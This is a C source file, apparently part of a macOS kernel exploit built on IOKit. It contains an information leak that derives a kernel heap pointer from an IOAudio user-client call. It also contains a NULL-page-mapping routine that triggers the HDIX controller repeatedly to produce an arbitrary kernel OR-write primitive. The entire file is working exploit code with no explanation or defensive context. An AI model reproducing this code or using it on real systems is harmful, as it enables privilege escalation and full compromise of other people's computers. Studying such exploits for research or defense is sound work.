#include "pwn.h"

static int pwn_init_set=0;
static io_service_t io_audio_controller=MACH_PORT_NULL, io_hdix_controller=MACH_PORT_NULL;

uint16_t pwn_init(void)
{
  kern_return_t kr;
  io_iterator_t iter;

  kr=IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching(IOAUDIO), &iter);
  assert(kr==KERN_SUCCESS);
  io_audio_controller = IOIteratorNext(iter);

  kr=IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching(IOHDIX), &iter);
  assert(kr==KERN_SUCCESS);
  io_hdix_controller=IOIteratorNext(iter);

  pwn_init_set|=0x1;

  return 0;
}

uint64_t io_audio_engine_infoleak(io_connect_t *conn)
{
  enum codes {
    ERR_OPEN_FAILED=1,
    ERR_SCALAR_INVALID
  };

  assert(io_audio_controller!=MACH_PORT_NULL);

  if (IOServiceOpen(io_audio_controller, mach_task_self(), 0, conn) != KERN_SUCCESS)
    return ERR_OPEN_FAILED;

  uint64_t connID=0;
  uint32_t outCnt=1;

  IOConnectCallScalarMethod(*conn, 2, NULL, 0, &connID, &outCnt);
  if (!connID)
    return ERR_SCALAR_INVALID;

  /* calculate kernel heap pointer */
  connID <<= 8;
  connID |= 0xffffff0000000000;

  return connID;
}

uint16_t or_primitive(uint64_t where)
{
  enum codes {
    ERR_NULL_MAP_FAILED=1,
    ERR_KERN_NOT_VULNERABLE,
    ERR_OFFSET_INVALID
  };

  kern_return_t kr;
  io_connect_t conn = MACH_PORT_NULL;

  static uint32_t offset;

  #define trigger() IOServiceOpen(io_hdix_controller, kIOMasterPortDefault, 0, &conn); IOServiceClose(conn);

  assert(io_hdix_controller!=MACH_PORT_NULL);

  mach_vm_address_t null_map=0x0;
  vm_deallocate(mach_task_self(), 0x0, 0x1000);
  kr=mach_vm_allocate(mach_task_self(), &null_map, 0x1000, 0);
  if (kr != KERN_SUCCESS)
    return ERR_NULL_MAP_FAILED;

  volatile uint64_t *fill=(uint64_t*)0x0;

  if (!offset) {
    while ((uint32_t)fill<LAND_AREA) {
      *fill=(uint64_t)LAND_AREA;
      ++fill;
    }
    trigger()

    char *ored=(char*)LAND_AREA;
    while ((uint32_t)ored<=0x1000) {
      if (*ored==0x10) {
        break;
      }
      if ((uint32_t)ored == 0x1000)
        return ERR_KERN_NOT_VULNERABLE;
      ++ored;
    }

    offset=(uint32_t)ored-(uint32_t)LAND_AREA;

    fill=(uint64_t*)0x0;
    while ((uint32_t)fill<LAND_AREA) {
      *fill=(uint64_t)(LAND_AREA-(uint64_t)offset);
      ++fill;
    }
    trigger()

    if (*(uint64_t*)LAND_AREA != 0x10) {
      return ERR_OFFSET_INVALID;
    }

  }

  fill=(uint64_t*)0x0;
  while ((uint32_t)fill<LAND_AREA) {
    *fill=(uint64_t)(where-(uint64_t)offset);
    ++fill;
  }
  trigger()

  return 0;
}
